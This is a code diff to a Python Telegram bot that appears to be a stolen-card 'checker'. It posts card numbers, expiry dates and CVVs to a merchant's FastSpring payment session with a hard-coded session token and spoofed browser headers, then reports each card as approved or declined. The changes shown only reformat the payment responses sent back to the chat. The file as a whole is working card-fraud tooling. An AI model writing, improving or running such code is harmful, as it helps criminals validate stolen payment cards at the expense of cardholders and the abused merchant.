@@ -32,7 +32,7 @@ HEADERS = {
     "sec-fetch-mode": "cors",
     "sec-fetch-site": "same-origin",
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
-    "x-session-token": "new/wBlCYyYnSuSncjZE506B-A"  # This token may expire/change; update if needed
+    "x-session-token": "new/wBlCYyYnSuSncjZE506B-A"  # Update if needed
 }
 
 CHECK_URL = "https://shortcutor.onfastspring.com/session/s1-standard-year1/payment"
@@ -99,13 +99,16 @@ def check_card(card):
         response = requests.post(CHECK_URL, json=payload, headers=HEADERS, timeout=30)
         response.raise_for_status()
         data = response.json()
-        # Determine card status
         messages = data.get("messages", [])
         declined = any(msg.get("type") == "danger" for msg in messages)
         status = "Declined" if declined else "Approved"
-        return status, data
+        # Extract only type and phrase from each message
+        filtered_messages = [
+            {"type": msg.get("type"), "phrase": msg.get("phrase")} for msg in messages
+        ]
+        return status, filtered_messages
     except Exception as e:
-        return "Error", {"error": str(e)}
+        return "Error", [{"type": "error", "phrase": str(e)}]
 
 def card_checking_thread(chat_id, cards):
     with lock:
@@ -117,11 +120,13 @@ def card_checking_thread(chat_id, cards):
                     bot.send_message(chat_id, "⏹️ Checking stopped by user.")
                     break
             bot.send_message(chat_id, f"🔎 Checking card {idx}/{len(cards)}: `{card['number']}|{card['month']}|{card['year']}|{card['cvv']}`", parse_mode='Markdown')
-            status, data = check_card(card)
+            status, messages = check_card(card)
             if status == "Error":
-                bot.send_message(chat_id, f"❌ Error checking card:\n`{data['error']}`", parse_mode='Markdown')
+                bot.send_message(chat_id, f"❌ Error checking card:\n`{messages[0]['phrase']}`", parse_mode='Markdown')
             else:
-                bot.send_message(chat_id, f"✅ Card {status}!\nFull response:\n`{data}`", parse_mode='Markdown')
+                # Format messages for output
+                msg_text = "\n".join(f"- type: `{m['type']}`, phrase: `{m['phrase']}`" for m in messages)
+                bot.send_message(chat_id, f"✅ Card {status}!\nMessages:\n{msg_text}", parse_mode='Markdown')
             if idx < len(cards):
                 time.sleep(15)
     finally:
